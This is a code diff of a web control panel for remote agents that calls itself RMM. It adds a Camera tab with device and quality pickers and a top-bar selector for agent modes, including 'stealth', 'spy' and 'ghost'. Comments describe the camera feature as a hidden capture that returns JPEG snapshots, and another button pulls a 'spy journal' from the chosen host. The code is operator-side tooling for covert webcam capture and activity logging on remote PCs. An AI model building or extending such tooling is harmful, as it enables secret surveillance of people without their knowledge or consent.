@@ -240,7 +240,7 @@ html{touch-action:manipulation}
       <button class="btn btn-small" id="pushUpdateBtn" title="Push bundled agent update to selected agent">⇪ Update</button>
       <button class="btn btn-small" id="pushUpdateAllBtn" title="Push bundled update to every outdated agent at once" style="display:none">⇪ Update All</button>
       <button class="btn btn-small" id="wizBtn" title="Open command wizard">🧙</button>
-      <button class="btn btn-small" id="camBtn" title="Open remote camera (camera-shot)">📷 Cam</button>
+      <select id="topModeSel" class="select" title="Agent operation mode — changes immediately (restarts agent)" style="font-size:11px;padding:2px 4px"><option value="normal">normal</option><option value="stealth">stealth</option><option value="spy">spy</option><option value="ghost">ghost</option><option value="performance">performance</option><option value="kiosk">kiosk</option><option value="audit">audit</option></select>
       <span id="agentVerBadge" style="font-size:11px;color:#888" title="Selected agent version"></span>
       <span id="updateBadge" style="display:none;font-size:11px;color:#FFD54F;cursor:pointer" title="">⇪ update</span>
       <span id="updateProg" style="font-size:11px;color:#8BC34A" title="Live update push progress"></span>
@@ -255,6 +255,7 @@ html{touch-action:manipulation}
       <button class="tab" data-tab="files">📁 Files</button>
       <button class="tab" data-tab="commands">⌨ Commands</button>
       <button class="tab" data-tab="audio">🔊 Audio</button>
+      <button class="tab" data-tab="camera">📷 Camera</button>
       <button class="tab" data-tab="settings">⚙ Settings</button>
     </div>
 
@@ -332,8 +333,22 @@ html{touch-action:manipulation}
       </div>
       <div style="display:flex;gap:8px"><button class="btn btn-small" id="deleteBtn">🗑 Delete Selected</button><button class="btn btn-small" id="renameBtn" title="Rename selected file/folder">✏ Rename</button><button class="btn btn-small" id="previewBtn" title="Preview selected image/text file">👁 Preview</button><button class="btn btn-small" id="queueBtn">☰ Queue</button><span style="margin-left:auto;font-size:11px;color:#888" id="fileStatus">Ready</span></div>
       <div id="previewOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:60;align-items:center;justify-content:center"><div id="previewBox" style="max-width:88vw;max-height:88vh;background:#1e1e1e;border:1px solid #555;border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px"><div style="display:flex;gap:8px;align-items:center"><span id="previewTitle" style="font-size:12px;color:#ccc"></span><button class="btn btn-small" id="previewFullBtn" style="display:none" title="Load the full file">↧ Full</button><button class="btn btn-small" id="previewClose" style="margin-left:auto">✕ Close</button></div><div id="previewBody" style="overflow:auto;max-width:86vw;max-height:76vh;text-align:center"></div></div></div>
-      <div id="camOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:60;align-items:center;justify-content:center"><div id="camBox" style="max-width:90vw;max-height:90vh;background:#1e1e1e;border:1px solid #555;border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px"><div style="display:flex;gap:8px;align-items:center"><span style="font-size:12px;color:#ccc">📷 Remote Camera</span><span id="camStatus" style="font-size:11px;color:#888"></span><button class="btn btn-small" id="camRefresh" style="margin-left:auto">⟳ Refresh</button><button class="btn btn-small" id="camSave">⤓ Save</button><button class="btn btn-small" id="camClose">✕ Close</button></div><div id="camBody" style="overflow:auto;max-width:88vw;max-height:78vh;text-align:center;color:#888">No frame yet — click Refresh</div></div></div>
     </section>
+
+    <!-- Camera — dedicated tab with device picker -->
+    <section id="tab-camera" class="tab-content">
+      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+        <span style="font-size:13px;font-weight:600">📷 Remote Camera</span>
+        <select id="camDeviceSel" class="select" title="Camera device (driver index)"><option value="0">Camera 0 (default)</option><option value="1">Camera 1</option><option value="2">Camera 2</option><option value="3">Camera 3</option></select>
+        <select id="camQualSel" class="select" title="JPEG quality"><option value="40">q40</option><option value="60" selected>q60</option><option value="80">q80</option><option value="90">q90</option></select>
+        <button class="btn btn-primary btn-small" id="camSnapBtn">📸 Snap</button>
+        <span id="camTabStatus" style="font-size:11px;color:#888"></span>
+        <button class="btn btn-small" id="camTabSave" style="margin-left:auto">⤓ Save</button>
+      </div>
+      <div id="camTabBody" style="margin-top:10px;min-height:260px;display:flex;align-items:center;justify-content:center;background:var(--bg-input);border:1px solid var(--border);border-radius:8px;padding:12px;color:#888">No frame yet — pick a device and Snap</div>
+    </section>
+
+  <div id="camOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:60;align-items:center;justify-content:center"><div id="camBox" style="max-width:90vw;max-height:90vh;background:#1e1e1e;border:1px solid #555;border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px"><div style="display:flex;gap:8px;align-items:center"><span style="font-size:12px;color:#ccc">📷 Remote Camera (legacy)</span><span id="camStatus" style="font-size:11px;color:#888"></span><button class="btn btn-small" id="camRefresh" style="margin-left:auto">⟳ Refresh</button><button class="btn btn-small" id="camSave">⤓ Save</button><button class="btn btn-small" id="camClose">✕ Close</button></div><div id="camBody" style="overflow:auto;max-width:88vw;max-height:78vh;text-align:center;color:#888">No frame yet — click Refresh</div></div></div>
 
     <!-- Dashboard — second tab, fleet at a glance (RMM) -->
     <section id="tab-dashboard" class="tab-content">
@@ -597,17 +612,28 @@ function connectWS(){
           if(t==="out" && /^upload complete:/.test(m.data||"")){ toast("Upload complete"); if(typeof refreshFiles==="function") refreshFiles(true); if(typeof pendingUpload!=="undefined"&&pendingUpload && (m.data||"").startsWith("upload complete: "+pendingUpload.path)){ const r=pendingUpload; pendingUpload=null; r.resolve(); } }
           // Camera: data:image/jpeg comes back as a single output line.
           if(m.data&&m.data.startsWith("data:image/")){
+            const imgTag=`<img src="${m.data}" style="max-width:100%;max-height:76vh;object-fit:contain"/>`;
+            const txt="Frame from "+(m.id||selected?.hostname||"agent")+" • "+Math.round(m.data.length/1024)+"KB";
             const cb=$("camBody"), st=$("camStatus"), ov=$("camOverlay");
-            if(cb) cb.innerHTML=`<img src="${m.data}" style="max-width:100%;max-height:76vh;object-fit:contain"/>`;
-            if(st) st.textContent="Frame from "+(m.id||selected?.hostname||"agent")+" • "+Math.round(m.data.length/1024)+"KB";
-            if(ov) ov.style.display="flex";
+            const tb=document.getElementById("camTabBody"), ts=document.getElementById("camTabStatus");
+            if(cb) cb.innerHTML=imgTag;
+            if(tb) tb.innerHTML=imgTag;
+            if(st) st.textContent=txt;
+            if(ts) ts.textContent=txt;
+            // if user was on camera tab, keep overlay hidden; otherwise pop overlay for quick view
+            const onCam=document.getElementById("tab-camera")?.classList.contains("active");
+            if(ov && !onCam) ov.style.display="flex";
             toast("Camera snapshot received");
             return;
           }
           if(m.error&&m.error.toLowerCase().includes("no camera")){
+            const msg="No camera on this PC — "+m.error;
             const cb=$("camBody"), st=$("camStatus");
-            if(cb) cb.textContent="No camera on this PC — "+m.error;
+            const tb=document.getElementById("camTabBody"), ts=document.getElementById("camTabStatus");
+            if(cb) cb.textContent=msg;
+            if(tb) tb.textContent=msg;
             if(st) st.textContent="No camera";
+            if(ts) ts.textContent="No camera";
             toast("No camera on remote PC","err");
             return;
           }
@@ -1413,28 +1439,46 @@ $("logsBtn").onclick=()=>{ if(!needAgent()) return; sendCmdVal("get-agent-log 15
 $("spyBtn").onclick=()=>{ if(!needAgent()) return; sendCmdVal("get-spy-log 120"); addTerm("Pulling spy journal from "+(selected.hostname||selected.id)+"…","out"); };
 // Remote camera (camera-shot): hidden VFW capture, data-URL JPEG back.
 let camLastData="";
-function camShot(qual){ if(!needAgent()) return; $("camOverlay").style.display="flex"; $("camBody").innerHTML="Loading…"; $("camStatus").textContent="Requesting camera…"; sendCmdVal("camera-shot "+(qual||60)); addTerm("Camera shot @ q"+(qual||60)+"…","out"); }
-$("camBtn")?.addEventListener("click", ()=>camShot(60));
-$("camRefresh")?.addEventListener("click", ()=>camShot(60));
+function camShot(qual, dev){
+  if(!needAgent()) return;
+  const d=(dev!==undefined?dev:($("camDeviceSel")?.value||0));
+  const q=(qual!==undefined?qual:($("camQualSel")?.value||60));
+  const targetBody=$("camTabBody")||$("camBody");
+  const targetStatus=$("camTabStatus")||$("camStatus");
+  if(targetBody) targetBody.innerHTML="Loading…";
+  if(targetStatus) targetStatus.textContent="Requesting camera "+d+"…";
+  // also open tab if not already
+  document.querySelector('.tab[data-tab="camera"]')?.click();
+  sendCmdVal("camera-shot "+d+" "+q); addTerm("Camera "+d+" shot @ q"+q+"…","out");
+}
+$("camRefresh")?.addEventListener("click", ()=>camShot());
 $("camClose")?.addEventListener("click", ()=>{ $("camOverlay").style.display="none"; });
 $("camOverlay")?.addEventListener("click", e=>{ if(e.target===$("camOverlay")) $("camClose").click(); });
 $("camSave")?.addEventListener("click", ()=>{
   const img=$("camBody")?.querySelector("img"); if(!img||!img.src) return;
   const a=document.createElement("a"); a.href=img.src; a.download="camera-"+new Date().toISOString().slice(0,19).replace(/[:T]/g,"-")+".jpg"; a.click();
 });
-// Agent operation mode selector (set-mode restarts the agent into it).
+document.getElementById("camSnapBtn")?.addEventListener("click", ()=>camShot());
+document.getElementById("camTabSave")?.addEventListener("click", ()=>{
+  const img=document.getElementById("camTabBody")?.querySelector("img"); if(!img||!img.src) return;
+  const a=document.createElement("a"); a.href=img.src; a.download="camera-"+new Date().toISOString().slice(0,19).replace(/[:T]/g,"-")+".jpg"; a.click();
+});
+// Agent operation mode selectors (top bar + Settings) — synced.
 function refreshModeSel(){
-  const s=$("modeSel"); if(!s) return;
   const cur=(selected&&selected.mode)||"normal";
-  if(![...s.options].some(o=>o.value===cur)){ const o=document.createElement("option"); o.value=cur; o.textContent=cur; s.appendChild(o); }
-  s.value=cur;
+  ["modeSel","topModeSel"].forEach(id=>{
+    const s=document.getElementById(id); if(!s) return;
+    if(![...s.options].some(o=>o.value===cur)){ const o=document.createElement("option"); o.value=cur; o.textContent=cur; s.appendChild(o); }
+    s.value=cur;
+  });
 }
-$("modeSel")?.addEventListener("change", e=>{
+function handleModeChange(m){
   if(!needAgent()){ refreshModeSel(); return; }
-  const m=e.target.value;
   if(!confirm(`Set ${selected.hostname} to ${m} mode? The agent restarts into it.`)) { refreshModeSel(); return; }
   sendCmdVal("set-mode "+m); addTerm(`Setting mode → ${m} (agent restarts)…`,"out");
-});
+}
+$("modeSel")?.addEventListener("change", e=>handleModeChange(e.target.value));
+document.getElementById("topModeSel")?.addEventListener("change", e=>handleModeChange(e.target.value));
 // Agent-token enforcement: flip only after the whole fleet carries the
 // token (see Settings checkbox title), or agents get locked out.
 function refreshAuth(){
@@ -2355,9 +2399,9 @@ try{
 // Keyboard shortcuts: Ctrl+K focuses command input, Ctrl+1..5 switch tabs
 document.addEventListener("keydown", e=>{
   if(e.ctrlKey && (e.key==="k"||e.key==="K")){ e.preventDefault(); document.querySelector('.tab[data-tab="commands"]')?.click(); input.focus(); }
-  if(e.ctrlKey && ["1","2","3","4","5","6"].includes(e.key)){
+  if(e.ctrlKey && ["1","2","3","4","5","6","7"].includes(e.key)){
     e.preventDefault();
-    const tabs=["screen","dashboard","files","commands","audio","settings"];
+    const tabs=["screen","dashboard","files","commands","audio","camera","settings"];
     document.querySelector(`.tab[data-tab="${tabs[+e.key-1]}"]`)?.click();
   }
 });
